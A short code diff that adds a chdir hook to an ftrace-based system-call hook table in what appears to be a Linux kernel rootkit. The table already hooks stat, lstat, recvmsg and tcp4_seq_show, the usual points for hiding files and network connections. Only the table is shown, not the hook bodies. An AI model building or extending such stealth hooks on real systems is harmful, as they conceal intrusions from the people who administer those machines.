@@ -12,6 +12,7 @@ struct ftrace_hook hooks[] = {
     HOOK_SYS("sys_lstat", stat_hook, &__orig_lstat),
     HOOK_SYS("sys_stat", stat_hook, &__orig_stat),
     HOOK_SYS("sys_recvmsg", recvmsg_hook, &__orig_recvmsg),
+    HOOK_SYS("sys_chdir",     chdir_hook,    &__orig_chdir),
 
     HOOK("tcp4_seq_show", tcp4_seq_show_hook, &__orig_tcp4_seq_show)
 };
